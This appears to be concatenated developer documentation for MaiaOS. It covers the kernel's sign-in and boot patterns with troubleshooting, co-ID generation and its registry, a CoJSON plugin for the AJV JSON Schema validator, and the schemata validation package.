+*Source: developers/02_maia-kernel/patterns.md*
+
+# Common Patterns and Troubleshooting
+
+Common usage patterns and solutions to frequent problems.
+
+---
+
+## Common Patterns
+
+### Pattern 1: Full App Setup
+
+```javascript
+import { createMaiaOS, MaiaOS } from '@MaiaOS/kernel';
+import { signInWithPasskey } from '@MaiaOS/self';
+
+async function setupApp() {
+  // Authenticate
+  const { node, account } = await signInWithPasskey({ salt: "maia.city" });
+  const o = await createMaiaOS({ node, account });
+  
+  // Boot OS
+  const os = await MaiaOS.boot({
+    modules: ['db', 'core', 'dragdrop', 'interface']
+  });
+  
+  // Load app
+  const { vibe, actor } = await os.loadVibeFromDatabase(
+    '@vibe/todos',
+    document.getElementById('app')
+  );
+  
+  return { o, os, vibe, actor };
+}
+```
+
+---
+
+### Pattern 2: Development Debugging
+
+```javascript
+const os = await MaiaOS.boot({ modules: ['db', 'core'] });
+
+// Expose for debugging
+window.os = os;
+window.engines = os.getEngines();
+
+// Inspect engines
+console.log("ActorEngine:", os.getEngines().actorEngine);
+console.log("ToolEngine:", os.getEngines().toolEngine);
+```
+
+---
+
+### Pattern 3: Custom Module Loading
+
+```javascript
+// Load only what you need
+const os = await MaiaOS.boot({
+  modules: ['db', 'core'] // Skip dragdrop and interface
+});
+```
+
+---
+
+## Troubleshooting
+
+### Problem: "Node and Account required"
+
+**Solution:** You must call `signInWithPasskey()` first:
+
+```javascript
+// ❌ Wrong
+const o = await createMaiaOS({});
+
+// ✅ Correct
+const { node, account } = await signInWithPasskey({ salt: "maia.city" });
+const o = await createMaiaOS({ node, account });
+```
+
+---
+
+### Problem: Module not found
+
+**Solution:** Check module name and ensure it exists:
+
+```javascript
+// ❌ Wrong
+await MaiaOS.boot({ modules: ['nonexistent'] });
+
+// ✅ Correct
+await MaiaOS.boot({ modules: ['db', 'core'] });
+```
+
+---
+
+### Problem: Schema validation fails during boot
+
+**Solution:** Check your schemas are valid JSON Schema:
+
+```javascript
+// Ensure schemas are valid before booting
+const validationEngine = new ValidationEngine();
+await validationEngine.initialize();
+// ... validate schemas
+```
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [auth-layer.md](./auth-layer.md) - Identity & Authentication layer
+- [boot-process.md](./boot-process.md) - Boot process details
+- [api-reference.md](./api-reference.md) - Complete API reference
+
+---
+
+# MAIA KERNEL/README
+
+*Source: developers/02_maia-kernel/README.md*
+
+# maia-kernel: Core System Services
+
+## Overview
+
+The `@MaiaOS/kernel` package provides the foundational services that power MaiaOS. Think of it as the operating system kernel - it doesn't do much on its own, but everything else depends on it.
+
+**What it does:**
+- ✅ **Identity & Authentication** - Creates authenticated MaiaOS instances (`createMaiaOS`)
+- ✅ **System Boot** - Initializes the entire OS with engines and modules (`MaiaOS.boot()`)
+- ✅ **Unified API** - Exposes a single entry point for all MaiaOS functionality
+
+**What it doesn't do:**
+- ❌ Execute MaiaScript (that's `@MaiaOS/script`)
+- ❌ Store data (that's `@MaiaOS/db`)
+- ❌ Validate schemas (that's `@MaiaOS/schemata`)
+
+---
+
+## The Simple Version
+
+Think of `maia-kernel` like the foundation of a house. Before you can build anything, you need:
+1. **Identity** - Who are you? (`createMaiaOS` - proves you're authenticated)
+2. **System** - What can you do? (`MaiaOS.boot()` - starts all the engines)
+
+**Analogy:**
+- `createMaiaOS` = Getting your ID card (proves who you are)
+- `MaiaOS.boot()` = Starting your computer (loads all the programs)
+
+---
+
+## Two Layers, One Package
+
+The kernel provides **two distinct layers** that work together:
+
+### Layer 1: Identity & Authentication (`createMaiaOS`)
+
+**What it is:** Proves who you are and gives you access to your account.
+
+**When to use:** Before booting the OS, you need to authenticate.
+
+```javascript
+import { createMaiaOS } from '@MaiaOS/kernel';
+import { signInWithPasskey } from '@MaiaOS/self';
+
+// Step 1: Authenticate (get your ID card)
+const { node, account, accountID } = await signInWithPasskey({
+  salt: "maia.city"
+});
+
+// Step 2: Create MaiaOS instance (prove you're authenticated)
+const o = await createMaiaOS({ node, account, accountID });
+```
+
+**What you get:**
+- `o.id` - Your account identity (MaiaID)
+- `o.auth` - Authentication management API
+- `o.inspector()` - Dev tool to inspect your account data
+- `o.getAllCoValues()` - List all CoValues in your account
+- `o.getCoValueDetail(coId)` - Get details about a specific CoValue
+
+### Layer 2: Actor & DSL Execution (`MaiaOS.boot()`)
+
+**What it is:** Starts all the engines that run your actors and execute MaiaScript.
+
+**When to use:** After authentication, boot the OS to run your app.
+
+```javascript
+import { MaiaOS } from '@MaiaOS/kernel';
+
+// Boot the operating system
+const os = await MaiaOS.boot({
+  modules: ['db', 'core', 'dragdrop', 'interface'],
+  registry: { /* configs */ }
+});
+
+// Now you can:
+// - os.createActor() - Create actors
+// - os.loadVibe() - Load app manifests
+// - os.sendMessage() - Send messages between actors
+```
+
+**What you get:**
+- `os.createActor()` - Create and render actors
+- `os.loadVibe()` - Load app manifests from files
+- `os.loadVibeFromDatabase()` - Load app manifests from database
+- `os.getActor()` - Get actor by ID
+- `os.sendMessage()` - Send messages to actors
+- `os.db()` - Execute database operations
+- `os.getEngines()` - Access all engines for debugging
+
+---
+
+## Documentation Structure
+
+This package documentation is organized into focused topics:
+
+- **[auth-layer.md](./auth-layer.md)** - Identity & Authentication layer (`createMaiaOS`)
+- **[boot-process.md](./boot-process.md)** - Boot process and execution layer (`MaiaOS.boot()`)
+- **[api-reference.md](./api-reference.md)** - Complete API reference
+- **[patterns.md](./patterns.md)** - Common patterns and troubleshooting
+
+---
+
+## Quick Start
+
+Here's the complete flow:
+
+```javascript
+import { createMaiaOS, MaiaOS } from '@MaiaOS/kernel';
+import { signInWithPasskey } from '@MaiaOS/self';
+
+async function startApp() {
+  // STEP 1: Authenticate (Identity Layer)
+  const { node, account, accountID } = await signInWithPasskey({
+    salt: "maia.city"
+  });
+  
+  const o = await createMaiaOS({ node, account, accountID });
+  console.log("✅ Authenticated as:", accountID);
+  
+  // STEP 2: Boot OS (Execution Layer)
+  const os = await MaiaOS.boot({
+    modules: ['db', 'core', 'dragdrop', 'interface']
+  });
+  
+  // STEP 3: Load your app
+  const { vibe, actor } = await os.loadVibeFromDatabase(
+    '@vibe/todos',
+    document.getElementById('app-container')
+  );
+  
+  console.log("✅ App loaded:", vibe.name);
+}
+```
+
+---
+
+## Related Documentation
+
+- [maia-script Package](../04_maia-script/README.md) - Execution engines
+- [MaiaOS Architecture](../01_maiaos.md) - Overall system architecture
+- [Authentication](../09_authentication.md) - Authentication flow
+- [CoJSON Integration](../07_cojson.md) - Database layer
+
+---
+
+## Source Files
+
+**Package:** `libs/maia-kernel/`
+
+**Key Files:**
+- `src/index.js` - Public API exports
+- `src/auth.js` - Identity/authentication layer (`createMaiaOS`)
+- `src/kernel.js` - Execution layer (`MaiaOS.boot()`)
+
+**Dependencies:**
+- `@MaiaOS/self` - Authentication
+- `@MaiaOS/script` - Engines and DSL execution
+- `@MaiaOS/db` - Database operations
+- `@MaiaOS/schemata` - Schema validation
+
+---
+
+# MAIA SCHEMATA/CO ID GENERATION
+
+*Source: developers/03_maia-schemata/co-id-generation.md*
+
+# Co-ID Generation
+
+## Overview
+
+Co-IDs are unique identifiers used throughout MaiaOS to reference schemas, instances, and data entities. Think of them like social security numbers - each one is unique and can be used to identify something specific.
+
+**What they are:**
+- Format: `co_z[A-Za-z0-9]{43}` (e.g., `co_z9h5nwiNynbxnC3nTwPMPkrVaMQ`)
+- Currently: Randomly generated (for seeding)
+- Future: Content-addressable (hash of content → co-id)
+
+**Why they matter:**
+- Enable reference resolution without human-readable mappings
+- Support distributed systems (co-ids are globally unique)
+- Prepare for CoJSON backend migration
+
+---
+
+## The Simple Version
+
+Imagine you're organizing a library. You could label books with names like "The Great Gatsby" (human-readable), but that's long and can have duplicates. Instead, you give each book a unique ID like "BK-12345" (co-id).
+
+**In MaiaOS:**
+- **Human-readable:** `@schema/actor` (easy to read, but not unique globally)
+- **Co-id:** `co_z9h5nwiNynbxnC3nTwPMPkrVaMQ` (unique globally, but harder to read)
+
+**During seeding:**
+- Generate co-ids for all schemas/instances
+- Replace human-readable IDs with co-ids
+- Store mappings in CoIdRegistry (for lookup)
+
+---
+
+## Co-ID Format
+
+### Structure
+
+```
+co_z + base64-like string (43 characters)
+```
+
+**Example:**
+```
+co_z9h5nwiNynbxnC3nTwPMPkrVaMQ
+```
+
+**Breakdown:**
+- `co_z`: Prefix (identifies as co-id)
+- `9h5nwiNynbxnC3nTwPMPkrVaMQ`: Base64-like string (43 chars)
+
+### Generation
+
+**Current implementation:**
+```javascript
+const randomBytes = new Uint8Array(32);
+crypto.getRandomValues(randomBytes);
+const base64 = btoa(String.fromCharCode(...randomBytes))
+  .replace(/\+/g, '')
+  .replace(/\//g, '')
+  .replace(/=/g, '')
+  .substring(0, 43);
+return `co_z${base64}`;
+```
+
+**Future implementation (content-addressable):**
+```javascript
+// Hash content to generate deterministic co-id
+const hash = await crypto.subtle.digest('SHA-256', JSON.stringify(content));
+const base64 = btoa(String.fromCharCode(...hash))
+  .replace(/\+/g, '')
+  .replace(/\//g, '')
+  .replace(/=/g, '')
+  .substring(0, 43);
+return `co_z${base64}`;
+```
+
+---
+
+## Co-ID Registry
+
+### Purpose
+
+The `CoIdRegistry` tracks mappings between human-readable IDs and co-ids during seeding.
+
+**Think of it like:** A phone book that maps names to phone numbers.
+
+**Example:**
+```
+Human-readable ID → Co-ID
+@schema/actor     → co_z123...
+@schema/context   → co_z456...
+@actor/vibe       → co_z789...
+```
+
+### Usage
+
+```javascript
+import { CoIdRegistry, generateCoId } from '@MaiaOS/schemata/co-id-generator';
+
+const registry = new CoIdRegistry();
+
+// Register mappings
+const schemaCoId = generateCoId(schema);
+registry.register('@schema/actor', schemaCoId);
+
+const instanceCoId = generateCoId(instance);
+registry.register('@actor/vibe', instanceCoId);
+
+// Later, retrieve co-ids
+const coId = registry.get('@schema/actor');  // Returns 'co_z123...'
+const humanId = registry.getHumanId('co_z123...');  // Returns '@schema/actor'
+```
+
+### Methods
+
+**`register(humanId, coId)`**
+- Registers a mapping
+- Prevents duplicate registrations (throws if different co-id for same human ID)
+- Allows one co-id to map to multiple human IDs (aliases)
+
+**`get(humanId)`**
+- Returns co-id for human-readable ID
+- Returns `null` if not found
+
+**`getHumanId(coId)`**
+- Returns human-readable ID for co-id
+- Returns first registered human ID (if multiple aliases)
+- Returns `null` if not found
+
+**`has(humanId)`**
+- Checks if human-readable ID is registered
+- Returns `boolean`
+
+**`getAll()`**
+- Returns all mappings as `Map`
+- Useful for building `coIdMap` for transformation
+
+**`clear()`**
+- Clears all registrations
+- Useful for testing or reset
+
+---
+
+## Generation Functions
+
+### `generateCoId(content)`
+
+Generates a co-id for any content (schema, instance, data entity, etc.).
+
+**Current behavior:**
+- Generates random co-id (ignores `content` parameter)
+- Same content → different co-id each time
+
+**Future behavior:**
+- Generates deterministic co-id from content hash
+- Same content → same co-id (content-addressable)
+
+**Example:**
+```javascript
+const schemaCoId = generateCoId(schema);
+const instanceCoId = generateCoId(instance);
+const dataCoId = generateCoId(dataEntity);
+```
+
+**Note:** All three functions (`generateCoIdForSchema`, `generateCoIdForInstance`, `generateCoIdForDataEntity`) have been consolidated into a single `generateCoId()` function.
+
+---
+
+## Seeding Process
+
+### Phase 1: Generate Co-IDs for Schemas
+
+```javascript
+const schemaCoIdMap = new Map();
+const coIdRegistry = new CoIdRegistry();
+
+for (const [name, schema] of Object.entries(schemas)) {
+  const coId = generateCoId(schema);
+  const schemaKey = `@schema/${name}`;
+  
+  schemaCoIdMap.set(schemaKey, coId);
+  coIdRegistry.register(schemaKey, coId);
+}
+```
+
+### Phase 2: Generate Co-IDs for Instances
+
+```javascript
+const instanceCoIdMap = new Map();
+
+for (const [id, instance] of instances) {
+  const coId = generateCoId(instance);
+  instanceCoIdMap.set(id, coId);
+  coIdRegistry.register(id, coId);
+}
+```
+
+### Phase 3: Generate Co-IDs for Data Entities
+
+```javascript
+for (const item of dataItems) {
+  if (!item.$id) {
+    item.$id = generateCoId(item);
+  }
+  // Store with co-id as primary key
+}
+```
+
+---
+
+## Common Patterns
+
+### Building Co-ID Map for Transformation
+
+```javascript
+const coIdMap = new Map();
+
+// Add schema co-ids
+for (const [humanId, coId] of coIdRegistry.getAll()) {
+  if (humanId.startsWith('@schema/')) {
+    coIdMap.set(humanId, coId);
+  }
+}
+
+// Add instance co-ids
+for (const [humanId, coId] of coIdRegistry.getAll()) {
+  if (humanId.startsWith('@actor/') || humanId.startsWith('@context/')) {
+    coIdMap.set(humanId, coId);
+  }
+}
+```
+
+### Checking if Co-ID Exists
+
+```javascript
+const coId = generateCoId(content);
+
+// Check if this co-id is already registered
+const existingHumanId = coIdRegistry.getHumanId(coId);
+if (existingHumanId) {
+  console.log(`Co-id ${coId} already exists for ${existingHumanId}`);
+  // Reuse existing co-id or generate new one?
+}
+```
+
+### Handling Duplicate Registrations
+
+```javascript
+try {
+  registry.register('@schema/actor', coId1);
+  registry.register('@schema/actor', coId2);  // Throws error!
+} catch (error) {
+  // Error: Co-id already registered for @schema/actor: co_z123... (trying to register co_z456...)
+}
+```
+
+---
+
+## Future: Content-Addressable Co-IDs
+
+### Why Content-Addressable?
+
+**Current (random):**
+- Same content → different co-id each time
+- Can't detect duplicates
+- Requires registry for lookup
+
+**Future (content-addressable):**
+- Same content → same co-id
+- Can detect duplicates automatically
+- Can verify content integrity
+- No registry needed (co-id = content hash)
+
+### Implementation Plan
+
+```javascript
+async function generateCoId(content) {
+  // Hash content
+  const contentString = JSON.stringify(content, Object.keys(content).sort());
+  const hashBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(contentString));
+  
+  // Convert to base64
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  const base64 = btoa(String.fromCharCode(...hashArray))
+    .replace(/\+/g, '')
+    .replace(/\//g, '')
+    .replace(/=/g, '')
+    .substring(0, 43);
+  
+  return `co_z${base64}`;
+}
+```
+
+**Benefits:**
+- Deterministic: Same content always generates same co-id
+- Verifiable: Can verify content matches co-id
+- Deduplication: Duplicate content automatically detected
+- Distributed: Works across systems without coordination
+
+---
+
+## Troubleshooting
+
+### Problem: "Co-id already registered for X"
+
+**Solution:** Check if you're trying to register the same human ID with a different co-id:
+```javascript
+// If this fails, the human ID is already registered
+try {
+  registry.register('@schema/actor', newCoId);
+} catch (error) {
+  // Use existing co-id instead
+  const existingCoId = registry.get('@schema/actor');
+}
+```
+
+### Problem: Co-ID not found during transformation
+
+**Solution:** Make sure co-ids are generated and registered before transformation:
+```javascript
+// 1. Generate co-ids
+const coId = generateCoId(schema);
+registry.register('@schema/actor', coId);
+
+// 2. Build co-id map
+const coIdMap = new Map(registry.getAll());
+
+// 3. Transform (now co-ids are available)
+transformSchemaForSeeding(schema, coIdMap);
+```
+
+---
+
+## Source Files
+
+- Co-ID generator: `libs/maia-schemata/src/co-id-generator.js`
+- Usage in seeding: `libs/maia-script/src/o/engines/db-engine/backend/indexeddb.js`
+
+---
+
+# MAIA SCHEMATA/COJSON INTEGRATION
+
+*Source: developers/03_maia-schemata/cojson-integration.md*
+
+# CoJSON Integration
+
+## Overview
+
+The `maia-schemata` package extends JSON Schema with support for CoJSON types (CoMap, CoList, CoStream) via a custom AJV plugin. Think of it as adding new words to a language - JSON Schema understands standard types (string, number, object), and we're teaching it to understand CoJSON types too.
+
+**What it adds:**
+- `cotype` keyword: Validates CoJSON CRDT types at schema root
+- `$co` keyword: Macro for co-id references in properties/items
+- Support for both direct arrays and wrapped objects (colist/costream)
+
+---
+
+## The Simple Version
+
+Imagine JSON Schema is a language that only knows about regular objects and arrays. CoJSON types are like special containers - they look similar, but they work differently (they're collaborative and conflict-free).
+
+**The problem:** JSON Schema doesn't know about CoJSON types.
+
+**The solution:** We teach JSON Schema about CoJSON types using custom keywords:
+- `cotype`: "This is a CoMap/CoList/CoStream"
+- `$co`: "This property references another CoJSON schema"
+
+**Example:**
+```json
+{
+  "$schema": "@schema/meta",
+  "cotype": "comap",
+  "properties": {
+    "viewRef": { "$co": "@schema/view" }
+  }
+}
+```
+
+This says: "This is a CoMap schema, and the `viewRef` property references the `@schema/view` schema."
+
+---
+
+## Custom Keywords
+
+### `cotype` Keyword
+
+**Purpose:** Validates that data is a CoJSON CRDT type.
+
+**Values:**
+- `"comap"`: Collaborative map (object-like)
+- `"colist"`: Collaborative list (array-like)
+- `"costream"`: Collaborative stream (array-like, append-only)
+
+**Where it's used:** At the schema root only (not in properties).
+
+**Example:**
+```json
+{
+  "$schema": "@schema/meta",
+  "title": "Todos Schema",
+  "cotype": "comap",
+  "properties": {
+    "text": { "type": "string" },
+    "done": { "type": "boolean" }
+  }
+}
+```
+
+**Validation:**
+- `comap`: Validates that data is an object (not array, not null)
+- `colist`/`costream`: Validates that data is either:
+  - A direct array: `[{...}, {...}]`
+  - An object with `items` array: `{$schema: "...", $id: "...", items: [{...}]}`
+
+### `$co` Keyword
+
+**Purpose:** Macro that expands to co-id string validation with schema reference metadata.
+
+**What it expands to:**
+```json
+{
+  "$co": "@schema/view"
+}
+```
+
+Expands to:
+```json
+{
+  "type": "string",
+  "pattern": "^co_z[a-zA-Z0-9]+$",
+  "_schemaRef": "@schema/view"
+}
+```
+
+**Where it's used:** In properties and items (not at schema root).
+
+**Example:**
+```json
+{
+  "properties": {
+    "viewRef": { "$co": "@schema/view" },
+    "contextRef": { "$co": "@schema/context" }
+  }
+}
+```
+
+**Transformation:**
+- Before seeding: `{ "$co": "@schema/view" }` (human-readable)
+- After seeding: `{ "$co": "co_z123..." }` (co-id)
+- Pattern validation ensures it's a valid co-id format
+
+---
+
+## AJV Plugin
+
+### How It Works
+
+The plugin registers two custom keywords with AJV:
+
+```javascript
+ajvCoTypesPlugin(ajv);
+
+// Now AJV understands:
+// - cotype keyword (validates CRDT types)
+// - $co keyword (macro for co-id references)
+```
+
+### Plugin Registration
+
+**When:** During `ValidationEngine.initialize()`
+
+**Where:** After meta-schemas are registered
+
+**Code:**
+```javascript
+// In validation.engine.js
+ajvCoTypesPlugin(this.ajv);
+```
+
+### Keyword Implementation
+
+**`cotype` keyword:**
+```javascript
+ajv.addKeyword({
+  keyword: 'cotype',
+  validate: (schema, data) => {
+    if (schema === 'comap') {
+      return typeof data === 'object' && !Array.isArray(data) && data !== null;
+    }
+    if (schema === 'colist' || schema === 'costream') {
+      // Direct array OR object with items array
+      return Array.isArray(data) || 
+             (typeof data === 'object' && data !== null && Array.isArray(data.items));
+    }
+    return false;
+  }
+});
+```
+
+**`$co` keyword:**
+```javascript
+ajv.addKeyword({
+  keyword: '$co',
+  macro: (schemaCoId) => ({
+    type: 'string',
+    pattern: '^co_z[a-zA-Z0-9]+$',
+    _schemaRef: schemaCoId  // Metadata for transformation
+  })
+});
+```
+
+---
+
+## CoJSON Meta-Schema
+
+### Structure
+
+The CoJSON meta-schema (`os/meta.schema.json`) extends the base JSON Schema meta-schema:
+
+```json
+{
+  "$schema": "https://json-schema.org/draft/2020-12/schema",
+  "$id": "@schema/meta",
+  "$vocabulary": {
+    "https://json-schema.org/draft/2020-12/vocab/core": true,
+    "https://maiaos.dev/vocab/cojson": true  // ← CoJSON vocabulary
+  },
+  "properties": {
+    "cotype": {
+      "enum": ["comap", "colist", "costream"]
+    },
+    "$co": {
+      "type": "string",
+      "anyOf": [
+        { "pattern": "^co_z[a-zA-Z0-9]+$" },
+        { "pattern": "^@schema/" }
+      ]
+    }
+  }
+}
+```
+
+### Vocabulary
+
+**CoJSON Vocabulary:** `https://maiaos.dev/vocab/cojson`
+
+**Purpose:** Indicates that this schema uses CoJSON types.
+
+**Usage:** Schemas with CoJSON types must use `$schema: "@schema/meta"` to enable `cotype` and `$co` keywords.
+
+---
+
+## Type Validation Details
+
+### CoMap Validation
+
+**Schema:**
+```json
+{
+  "cotype": "comap",
+  "properties": { ... }
+}
+```
+
+**Valid data:**
+```json
+{
+  "name": "my-map",
+  "value": 42
+}
+```
+
+**Invalid data:**
+```json
+[]  // ❌ Array, not object
+null  // ❌ Null, not object
+```
+
+### CoList Validation
+
+**Schema:**
+```json
+{
+  "cotype": "colist",
+  "items": { "type": "string" }
+}
+```
+
+**Valid data (direct array):**
+```json
+["item1", "item2", "item3"]
+```
+
+**Valid data (wrapped object):**
+```json
+{
+  "$schema": "co_z123...",
+  "$id": "co_z456...",
+  "items": ["item1", "item2", "item3"]
+}
+```
+
+**Invalid data:**
+```json
+{}  // ❌ Object without items array
+null  // ❌ Null
+```
+
+### CoStream Validation
+
+**Schema:**
+```json
+{
+  "cotype": "costream",
+  "items": { "type": "object" }
+}
+```
+
+**Valid data:** Same as CoList (direct array or wrapped object)
+
+**Difference:** CoStream is append-only (enforced at runtime, not schema level)
+
+---
+
+## Common Patterns
+
+### CoMap Schema
+
+```json
+{
+  "$schema": "@schema/meta",
+  "title": "Actor Schema",
+  "cotype": "comap",
+  "properties": {
+    "name": { "type": "string" },
+    "viewRef": { "$co": "@schema/view" },
+    "contextRef": { "$co": "@schema/context" }
+  },
+  "required": ["name"]
+}
+```
+
+### CoList Schema
+
+```json
+{
+  "$schema": "@schema/meta",
+  "title": "Todos List Schema",
+  "cotype": "colist",
+  "items": {
+    "$co": "@schema/todo-item"
+  }
+}
+```
+
+### Nested References
+
+```json
+{
+  "$schema": "@schema/meta",
+  "title": "Context Schema",
+  "cotype": "comap",
+  "properties": {
+    "todos": {
+      "$co": "@schema/todos"  // References colist schema
+    }
+  }
+}
+```
+
+---
+
+## Transformation Flow
+
+### Before Seeding
+
+```json
+{
+  "$schema": "@schema/meta",
+  "cotype": "comap",
+  "properties": {
+    "viewRef": { "$co": "@schema/view" }
+  }
+}
+```
+
+### After Seeding
+
+```json
+{
+  "$schema": "co_z111...",
+  "cotype": "comap",
+  "properties": {
+    "viewRef": { "$co": "co_z222..." }
+  }
+}
+```
+
+**What changed:**
+- `$schema`: `@schema/meta` → `co_z111...`
+- `$co`: `@schema/view` → `co_z222...`
+- `cotype`: Unchanged (not a reference)
+
+---
+
+## Troubleshooting
+
+### Problem: "must pass 'cotype' keyword validation"
+
+**Solution:** Add `cotype` to schema root:
+```json
+{
+  "$schema": "@schema/meta",
+  "cotype": "comap",  // ← Add this!
+  "properties": { ... }
+}
+```
+
+### Problem: "Nested CoJSON types found"
+
+**Solution:** Use `$co` instead of nesting `cotype`:
+```json
+// ❌ Wrong
+{
+  "properties": {
+    "items": { "cotype": "colist" }
+  }
+}
+
+// ✅ Correct
+{
+  "properties": {
+    "items": { "$co": "@schema/items" }
+  }
+}
+```
+
+### Problem: "must be string" for `$co` property
+
+**Solution:** Make sure `$co` value is transformed to co-id:
+```javascript
+// Before transformation: { "$co": "@schema/view" }  // ❌ Fails validation
+// After transformation: { "$co": "co_z123..." }     // ✅ Passes validation
+```
+
+---
+
+## Source Files
+
+- Plugin implementation: `libs/maia-schemata/src/ajv-co-types-plugin.js`
+- Meta-schema: `libs/maia-schemata/src/os/meta.schema.json`
+- Base meta-schema: `libs/maia-schemata/src/os/base-meta-schema.json`
+
+---
+
+# MAIA SCHEMATA/README
+
+*Source: developers/03_maia-schemata/README.md*
+
+# maia-schemata: Schema Validation and Transformation
+
+## Overview
+
+The `maia-schemata` package is MaiaOS's centralized schema validation and transformation system. Think of it as the quality control inspector for your MaiaOS applications - it checks that everything is built correctly before it goes into production.
+
+**What it does:**
+- ✅ Validates all `.maia` files against JSON Schema definitions
+- ✅ Transforms human-readable references to co-ids during seeding
+- ✅ Provides runtime validation for application data
+- ✅ Supports CoJSON types (CoMap, CoList, CoStream) via custom AJV plugin
+
+**Why it matters:**
+Without schema validation, a typo in a `.maia` file could cause your entire app to break in mysterious ways. The validation system catches these errors early with clear, helpful messages.
+
+---
+
+## The Simple Version
+
+Think of schemas like blueprints for houses. When you're building a house, you need to follow the blueprint exactly - the door can't be where the window should be, and the foundation needs to be the right size.
+
+In MaiaOS:
+- **Schemas** = Blueprints (they define what's allowed)
+- **Validation** = Quality inspector (checks if you followed the blueprint)
+- **Transformation** = Converting your blueprint to the builder's language (human-readable IDs → co-ids)
+
+**Example:**
+```javascript
+// You write this in your .maia file:
+{
+  "actor": {
+    "name": "my-actor",
+    "view": { "type": "div" }
+  }
+}
+
+// The validation system checks:
+// ✅ Does it have a "name"? Yes!
+// ✅ Is "name" a string? Yes!
+// ✅ Does it have a "view"? Yes!
+// ✅ Is "view" a valid view object? Yes!
+// Result: ✅ Valid!
+```
+
+---
+
+## Package Structure
+
+```
+libs/maia-schemata/src/
+├── index.js                    # Main exports (schemas, ValidationEngine)
+├── validation.engine.js        # Core validation engine (AJV wrapper)
+├── validation.helper.js        # Convenience functions (singleton, error formatting)
+├── schema-transformer.js       # Transform schemas/instances for seeding
+├── co-id-generator.js          # Generate co-ids for seeding
+├── schema-loader.js            # Load schemas from IndexedDB
+├── ajv-co-types-plugin.js     # AJV plugin for CoJSON types
+├── os/                         # Operating system schemas
+│   ├── actor.schema.json
+│   ├── context.schema.json
+│   ├── state.schema.json
+│   ├── view.schema.json
+│   ├── meta.schema.json        # CoJSON meta-schema
+│   └── base-meta-schema.json   # JSON Schema Draft 2020-12 meta-schema
+└── data/                       # Application data schemas
+    └── todos.schema.json
+```
+
+---
+
+## Key Components
+
+### 1. ValidationEngine
+
+The core validation system. Wraps AJV (Another JSON Schema Validator) and adds CoJSON support.
+
+**What it does:**
+- Loads and compiles JSON schemas
+- Validates data against schemas
+- Resolves schema dependencies ($schema, $co references)
+- Handles co-id references from IndexedDB
+
+**See:** [Validation Engine Details](./validation.md)
+
+### 2. Schema Transformer
+
+Converts human-readable references to co-ids during the seeding process.
+
+**What it does:**
+- Transforms `@schema/actor` → `co_z123...`
+- Handles nested query objects (`{schema: "@schema/todos", filter: {...}}`)
+- Transforms tool payloads and action targets
+
+**See:** [Schema Transformation](./transformation.md)
+
+### 3. Co-ID Generator
+
+Generates deterministic co-ids for schemas, instances, and data entities.
+
+**What it does:**
+- Creates random co-ids in format `co_z[A-Za-z0-9]{43}`
+- Tracks mappings via CoIdRegistry
+- Currently generates random IDs (future: content-addressable hashing)
+
+**See:** [Co-ID Generation](./co-id-generation.md)
+
+### 4. AJV CoJSON Plugin
+
+Custom AJV plugin that adds support for CoJSON types.
+
+**What it does:**
+- Adds `cotype` keyword (validates comap/colist/costream at schema root)
+- Adds `$co` keyword (macro for co-id references in properties)
+- Handles both direct arrays and wrapped objects for colist/costream
+
+**See:** [CoJSON Integration](./cojson-integration.md)
+
+---
+
+## How It Works
+
+### The Validation Flow
+
+```
+1. Load Schema
+   └─> Get schema from registry (os/ or data/)
+   └─> Compile with AJV
+   └─> Cache compiled validator
+
+2. Validate Data
+   └─> Run data through compiled validator
+   └─> Collect all errors (not just first)
+   └─> Format errors for readability
+
+3. Handle Errors
+   └─> Show clear error messages
+   └─> Point to exact field that failed
+   └─> Suggest fixes
+```
+
+### The Seeding Flow
+
+```
+1. Load Schemas
+   └─> Read all schema files from os/ and data/
+   └─> Generate co-ids for each schema
+   └─> Build dependency graph
+
+2. Transform Schemas
+   └─> Replace @schema/... references with co-ids
+   └─> Transform $co references
+   └─> Preserve structure
+
+3. Transform Instances
+   └─> Transform query objects ({schema: "@schema/todos"})
+   └─> Transform tool payloads
+   └─> Transform action targets
+
+4. Seed to IndexedDB
+   └─> Store schemas with co-ids as keys
+   └─> Store instances with co-ids as keys
+   └─> Register mappings in CoIdRegistry
+```
+
+---
+
+## Common Patterns
+
+### Validating a Schema File
+
+```javascript
+import { validateOrThrow } from '@MaiaOS/schemata/validation.helper';
+
+try {
+  await validateOrThrow('actor', actorData, 'path/to/actor.maia');
+  console.log('✅ Valid!');
+} catch (error) {
+  console.error('❌ Validation failed:', error.message);
+}
+```
+
+### Getting a Schema
+
+```javascript
+import { getSchema } from '@MaiaOS/schemata';
+
+const actorSchema = getSchema('actor');
+console.log(actorSchema); // Full JSON Schema object
+```
+
+### Transforming for Seeding
+
+```javascript
+import { transformSchemaForSeeding } from '@MaiaOS/schemata/schema-transformer';
+
+const coIdMap = new Map([
+  ['@schema/actor', 'co_z123...'],
+  ['@schema/context', 'co_z456...']
+]);
+
+const transformedSchema = transformSchemaForSeeding(actorSchema, coIdMap);
+// All @schema/... references are now co-ids
+```
+
+### Generating Co-IDs
+
+```javascript
+import { generateCoId, CoIdRegistry } from '@MaiaOS/schemata/co-id-generator';
+
+const registry = new CoIdRegistry();
+const schemaCoId = generateCoId(schema);
+registry.register('@schema/actor', schemaCoId);
+
+// Later, retrieve the co-id
+const coId = registry.get('@schema/actor'); // Returns 'co_z123...'
+```
+
+---
+
+## Integration Points
+
+### With maia-script
+
+The `maia-script` package uses `maia-schemata` for:
+- Validating `.maia` files during parsing
+- Transforming schemas/instances before seeding to IndexedDB
+- Runtime validation of data operations
+
+**See:** `libs/maia-script/src/o/engines/db-engine/backend/indexeddb.js`
+
+### With maia-db
+
+The `maia-db` package uses `maia-schemata` for:
+- Loading schemas from IndexedDB for validation
+- Resolving co-id references during validation
+- Validating data before create/update operations
+
+---
+
+## Key Concepts
+
+### Schema Types
+
+**OS Schemas** (`os/`):
+- Define MaiaOS system types (actor, context, state, view, etc.)
+- Used for validating `.maia` file definitions
+- Examples: `actor.schema.json`, `context.schema.json`
+
+**Data Schemas** (`data/`):
+- Define application data types (todos, notes, etc.)
+- Used for runtime validation of user data
+- Examples: `todos.schema.json`
+
+### Meta-Schemas
+
+**Base Meta-Schema** (`base-meta-schema.json`):
+- JSON Schema Draft 2020-12 meta-schema
+- Validates all standard JSON Schema schemas
+- Extracted from hardcoded object to JSON file
+
+**CoJSON Meta-Schema** (`meta.schema.json`):
+- Extends base meta-schema with CoJSON vocabulary
+- Adds `cotype` and `$co` keywords
+- Validates MaiaOS-specific schemas
+
+### Reference Types
+
